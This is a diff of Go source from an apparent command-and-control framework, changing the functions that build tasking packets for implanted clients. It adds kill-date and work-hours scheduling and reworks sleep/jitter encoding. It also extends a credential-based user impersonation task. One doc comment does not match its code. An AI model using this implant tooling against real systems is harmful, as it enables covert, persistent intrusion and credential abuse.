@@ -178,24 +178,30 @@ func IsDebugged() *com.Packet {
 }
 
 // Jitter returns a set Session jitter Packet. This can be used to instruct the
-// client to update its jitter value to the specified 0-100 percentage.
+// client to update it's jitter value to the specified 0-100 percentage.
 //
 // Anything greater than 100 will be capped to 100 and anything less than zero
 // (except -1) will be set to zero. Values of -1 are ignored. This setting will
 // NOT override the Sleep setting.
 //
-// IT IS RECOMMENDED TO USE THE 'Session.Jitter' CALL INSTEAD TO PREVENT DE-SYNC
-// ISSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
-//
 // C2 Details:
 //  ID: MvTime
 //
 //  Input:
-//      int8   // Jitter
-//      uint64 // Sleep (0 for this)
+//      uint8       // Always 0 for this Task
+//      int8        // Jitter
+//      uint64      // Always 0 for this Task
 //  Output:
-//      uint8  // Jitter
-//      uint64 // Sleep
+//      uint8       // Jitter
+//      uint64      // Sleep
+//      uint64      // Kill Date
+//      WorkHours { // Work Hours
+//          uint8   // Day
+//          uint8   // Start Hour
+//          uint8   // Start Min
+//          uint8   // End Hour
+//          uint8   // End Min
+//      }
 func Jitter(j int) *com.Packet {
 	return Duration(0, j)
 }
@@ -238,6 +244,39 @@ func Cwd(d string) *com.Packet {
 func Profile(b []byte) *com.Packet {
 	n := &com.Packet{ID: MvProfile}
 	n.WriteBytes(b)
+	return n
+}
+
+// KillDate returns a set Session kill date Packet. This can be used to instruct
+// the client to update it's kill date to the specified date value.
+//
+// If the time supplied is the empty time struct, this will clear any Kill Date
+// if it exists.
+//
+// C2 Details:
+//  ID: MvTime
+//
+//  Input:
+//      uint8       // Always 1 for this Task
+//      uint64      // Unix time
+//  Output:
+//      uint8       // Jitter
+//      uint64      // Sleep
+//      uint64      // Kill Date
+//      WorkHours { // Work Hours
+//          uint8   // Day
+//          uint8   // Start Hour
+//          uint8   // Start Min
+//          uint8   // End Hour
+//          uint8   // End Min
+//      }
+func KillDate(t time.Time) *com.Packet {
+	n := &com.Packet{ID: MvTime}
+	if n.WriteUint8(1); t.IsZero() {
+		n.WriteUint64(0)
+	} else {
+		n.WriteInt64(t.Unix())
+	}
 	return n
 }
 
@@ -296,23 +335,29 @@ func UserLogoff(sid int32) *com.Packet {
 }
 
 // Sleep returns a set Session sleep Packet. This can be used to instruct the
-// client to update its sleep value to the specified duration.
+// client to update it's sleep value to the specified duration.
 //
 // Anything less than or equal to zero is ignored! This setting will NOT override
 // the Jitter setting.
-//
-// IT IS RECOMMENDED TO USE THE 'Session.Sleep' CALL INSTEAD TO PREVENT DE-SYNC
-// ISSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
 //
 // C2 Details:
 //  ID: MvTime
 //
 //  Input:
-//      int8   // Jitter (-1 for this)
-//      uint64 // Sleep
+//      uint8       // Always 0 for this Task
+//      int8        // Always -1 for this Task
+//      uint64      // Sleep
 //  Output:
-//      uint8  // Jitter
-//      uint64 // Sleep
+//      uint8       // Jitter
+//      uint64      // Sleep
+//      uint64      // Kill Date
+//      WorkHours { // Work Hours
+//          uint8   // Day
+//          uint8   // Start Hour
+//          uint8   // Start Min
+//          uint8   // End Hour
+//          uint8   // End Min
+//      }
 func Sleep(d time.Duration) *com.Packet {
 	return Duration(d, -1)
 }
@@ -435,7 +480,7 @@ func UserDisconnect(sid int32) *com.Packet {
 }
 
 // Duration returns a set Session sleep and/or jitter Packet. This can be used
-// to instruct the client to update its sleep and jitters value to the specified
+// to instruct the client to update it's sleep and jitters value to the specified
 // duration and 0-100 percentage values if they are not unset. (-1 for Jitter,
 // anything <=0 for Sleep).
 //
@@ -444,21 +489,27 @@ func UserDisconnect(sid int32) *com.Packet {
 // For Jitter, anything greater than 100 will be capped to 100 and anything less
 // than zero (except -1) will be set to zero. Values of -1 are ignored.
 //
-// IT IS RECOMMENDED TO USE THE 'Session.Duration' CALL INSTEAD TO PREVENT DE-SYNC
-// ISSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
-//
 // C2 Details:
 //  ID: MvTime
 //
 //  Input:
-//      int8   // Jitter
-//      uint64 // Sleep
+//      uint8       // Always 0 for this Task
+//      int8        // Jitter
+//      uint64      // Sleep
 //  Output:
-//      uint8  // Jitter
-//      uint64 // Sleep
+//      uint8       // Jitter
+//      uint64      // Sleep
+//      uint64      // Kill Date
+//      WorkHours { // Work Hours
+//          uint8   // Day
+//          uint8   // Start Hour
+//          uint8   // Start Min
+//          uint8   // End Hour
+//          uint8   // End Min
+//      }
 func Duration(d time.Duration, j int) *com.Packet {
 	n := &com.Packet{ID: MvTime}
-	n.WriteInt8(int8(j))
+	n.WriteUint16(uint16(j & 0xFF))
 	n.WriteUint64(uint64(d))
 	return n
 }
@@ -489,29 +540,6 @@ func Proxy(name, addr string, p []byte) *com.Packet {
 	return n
 }
 
-// LoginUser returns an impersonate user Packet. This will instruct the client to
-// use the provided credentials to change it's Token to the user that owns the
-// supplied credentials.
-//
-// Always returns 'ErrNoWindows' on non-Windows devices.
-//
-// C2 Details:
-//  ID: TvLoginUser
-//
-//  Input:
-//      string // Username
-//      string // Domain
-//      string // Password
-//  Output:
-//      <none>
-func LoginUser(user, domain, pass string) *com.Packet {
-	n := &com.Packet{ID: TvLoginUser}
-	n.WriteString(user)
-	n.WriteString(domain)
-	n.WriteString(pass)
-	return n
-}
-
 // ProxyReplace returns a replace Proxy Packet. This can be used to instruct
 // the client to attempt to call the 'Replace' function on the specified Proxy
 // with the name, bind address and Profile bytes as the arguments.
@@ -538,31 +566,69 @@ func ProxyReplace(name, addr string, p []byte) *com.Packet {
 	return n
 }
 
-// UserMessageBox returns a MessageBox Packet. This will instruct the client to
-// create a MessageBox with the supplied parent and message options under the
-// specified Session ID (or -1 for the current session).
+// LoginUser returns an impersonate user Packet. This will instruct the client to
+// use the provided credentials to change it's Token to the user that owns the
+// supplied credentials.
+//
+// If the interactive boolen at the start is true, the client will do an interactive
+// login instead. This allows for more access and will change the username, but
+// may prevent access to network resources.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices. (for now).
 //
 // C2 Details:
-//  ID: TvLoginsAct
+//  ID: TvLoginUser
 //
 //  Input:
-//      uint8  // Always 2 for this task.
-//      int32  // Session ID
-//      uint32 // Flags
-//      uint32 // Timeout in seconds
-//      bool   // Wait for User
-//      string // Title
-//      string // Text
+//      bool   // Interactive
+//      string // Username
+//      string // Domain
+//      string // Password
 //  Output:
-//      uint32 // MessageBox return result
-func UserMessageBox(sid int32, title, text string, flags, secs uint32, wait bool) *com.Packet {
-	n := &com.Packet{ID: TvLoginsAct}
-	n.WriteUint8(taskLoginsMessage)
-	n.WriteInt32(sid)
-	n.WriteUint32(flags)
-	n.WriteUint32(secs)
-	n.WriteBool(wait)
-	n.WriteString(title)
-	n.WriteString(text)
+//      <none>
+func LoginUser(interactive bool, user, domain, pass string) *com.Packet {
+	n := &com.Packet{ID: TvLoginUser}
+	n.WriteBool(interactive)
+	n.WriteString(user)
+	n.WriteString(domain)
+	n.WriteString(pass)
+	return n
+}
+
+// WorkHours returns a set Session Work Hours Packet. This can be used to instruct
+// the client to update it's working hours to the supplied work hours values as
+// uint8 values.
+//
+// Days is a bitmask of the days that the WorkHours applies to The bit values are
+// 0 (Sunday) to 7 (Saturday). Values 0, 255 and anything over 126 are treated
+// as all days selected.
+//
+// If all the supplied values are zero, this will clear any previous Work Hours
+// set.
+//
+// C2 Details:
+//  ID: MvTime
+//
+//  Input:
+//      uint8       // Always 2 for this Task
+//      uint64      // Unix time
+//  Output:
+//      uint8       // Jitter
+//      uint64      // Sleep
+//      uint64      // Kill Date
+//      WorkHours { // Work Hours
+//          uint8   // Day
+//          uint8   // Start Hour
+//          uint8   // Start Min
+//          uint8   // End Hour
+//          uint8   // End Min
+//      }
+func WorkHours(day, startHour, startMin, endHour, endMin uint8) *com.Packet {
+	n := &com.Packet{ID: MvTime}
+	n.WriteUint16(0x200 | uint16(day&0xFF))
+	n.WriteUint8(startHour)
+	n.WriteUint8(startMin)
+	n.WriteUint8(endHour)
+	n.WriteUint8(endMin)
 	return n
 }
